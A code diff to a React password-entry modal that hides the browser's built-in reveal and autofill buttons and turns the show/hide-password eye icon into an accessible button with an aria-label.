@@ -90,7 +90,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                     }}
                     autoComplete='current-password'
                     placeholder=' '
-                    className='peer h-[34px] w-full bg-transparent pr-[34px] text-[14px] outline-none sm:h-[38px] sm:pr-[40px] sm:text-[15px]'
+                    className='peer h-[34px] w-full bg-transparent pr-[34px] text-[14px] outline-none sm:h-[38px] sm:pr-[40px] sm:text-[15px] [&::-ms-reveal]:hidden [&::-webkit-credentials-auto-fill-button]:hidden'
                     style={{ fontFamily: "'Optimistic', system-ui, sans-serif", color: '#111112' }}
                 />
                 <label
@@ -104,7 +104,9 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                 >
                     {t('Password')}
                 </label>
-                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#666A72] select-none sm:right-[16px]' size='lg' onClick={togglePassword} style={{ fontSize: '18px' }} />
+                <button type='button' onClick={togglePassword} className='absolute top-1/2 right-3 flex -translate-y-1/2 cursor-pointer items-center justify-center border-0 bg-transparent p-1 text-[#666A72] select-none sm:right-[16px]' tabIndex={-1} aria-label={showPassword ? 'Hide password' : 'Show password'}>
+                    <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} style={{ fontSize: '18px', display: 'block' }} />
+                </button>
             </div>
 
             {showError && (
